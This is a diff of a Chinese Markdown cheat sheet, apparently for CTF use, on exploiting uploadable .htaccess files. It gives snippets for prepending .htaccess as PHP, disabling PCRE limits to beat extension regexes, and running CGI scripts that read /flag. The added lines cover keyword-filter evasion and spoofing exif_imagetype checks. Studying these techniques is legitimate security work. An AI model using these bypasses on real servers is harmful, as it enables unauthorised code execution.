@@ -176,27 +176,7 @@ https://htaccess.iapolo.com/ 在线生成各种功能的htaccess文件
 SetHandler server-status
 ```
 
-2、 可以使用如下语句
-```php
-php_value auto_prepend_file  ".htaccess"
-# <?php phpinfo(); ?>
-```
-本地测试发现，会爆500错误
-[![1qLd4P.md.png](https://s2.ax1x.com/2020/02/13/1qLd4P.md.png)](https://imgchr.com/i/1qLd4P)
-phpstudy_pro中php版本 测试无一成功，用phpstudy2018版本中，仅非nts版本测试成功，
-[![1qLhCV.png](https://s2.ax1x.com/2020/02/13/1qLhCV.png)](https://imgchr.com/i/1qLhCV) &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;[![1qLjC6.png](https://s2.ax1x.com/2020/02/13/1qLjC6.png)](https://imgchr.com/i/1qLjC6)
-
-成功结果如下
-[![1qXhXF.png](https://s2.ax1x.com/2020/02/13/1qXhXF.png)](https://imgchr.com/i/1qXhXF)
-
-也就是说利用php_value时，存在失败的可能，原因通过日志来看
-```
-Invalid command 'php_value', perhaps misspelled or defined by a module not included in the server configuration
-```
-nts含义就不在这里说了。可能是PHP处理程序不同的原因，原因可以参考一下 https://forums.cpanel.net/threads/invalid-command-php_value-perhaps-mis-spelled-or-defined-by-a-module-not-included.184931/
-[PHP处理程序](http://www.voidcn.com/article/p-qfxtodcn-btz.html)
-
-3. 如果检测后缀的正则表达式，且php同上为非nts，则可以上传.htaccess，内容如下
+2. 如果检测后缀的正则表达式，且php同上为非nts，则可以上传.htaccess，内容如下
 ```
 php_value pcre.backtrack_limit 0
 php_value pcre.jit 0
@@ -224,7 +204,7 @@ pcre.backtrack_limit 与 pcre.jit的解释在PHP手册的**PHP Manual›php.ini 
 
 也就是说第一步先上传.htaccess，然后再上传php文件。
 
-4.apache加载了cgi_module 还可使用如下
+3.apache加载了cgi_module 还可使用如下
 ```xml
 Options +ExecCGI
 AddHandler cgi-script .xx
@@ -240,10 +220,37 @@ echo ""
 cat /flag
 ```
 
-5.绕过关键字
+4.绕过
 
-\#  0x00 可以当注释  \ +换行
+\#  0x00 可以当注释  \ +换行 绕过关键字
+htaccess 大小写不敏感
 
+如下可绕过 exif_imagetype 检测
+```
+#define xlogo_width 1337
+#define xlogo_height 1337
+```
+
+
+5、 可以使用如下语句
+```php
+php_value auto_prepend_file  ".htaccess"
+# <?php phpinfo(); ?>
+```
+本地测试发现，会爆500错误
+[![1qLd4P.md.png](https://s2.ax1x.com/2020/02/13/1qLd4P.md.png)](https://imgchr.com/i/1qLd4P)
+phpstudy_pro中php版本 测试无一成功，用phpstudy2018版本中，仅非nts版本测试成功，
+[![1qLhCV.png](https://s2.ax1x.com/2020/02/13/1qLhCV.png)](https://imgchr.com/i/1qLhCV) &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;[![1qLjC6.png](https://s2.ax1x.com/2020/02/13/1qLjC6.png)](https://imgchr.com/i/1qLjC6)
+
+成功结果如下
+[![1qXhXF.png](https://s2.ax1x.com/2020/02/13/1qXhXF.png)](https://imgchr.com/i/1qXhXF)
+
+也就是说利用php_value时，存在失败的可能，原因通过日志来看
+```
+Invalid command 'php_value', perhaps misspelled or defined by a module not included in the server configuration
+```
+nts含义就不在这里说了。可能是PHP处理程序不同的原因，原因可以参考一下 https://forums.cpanel.net/threads/invalid-command-php_value-perhaps-mis-spelled-or-defined-by-a-module-not-included.184931/
+[PHP处理程序](http://www.voidcn.com/article/p-qfxtodcn-btz.html)
 
 .更多用法可以参考php手册的php.ini 配置选项列表
 [![1LPtte.md.png](https://s2.ax1x.com/2020/02/13/1LPtte.md.png)](https://imgchr.com/i/1LPtte)
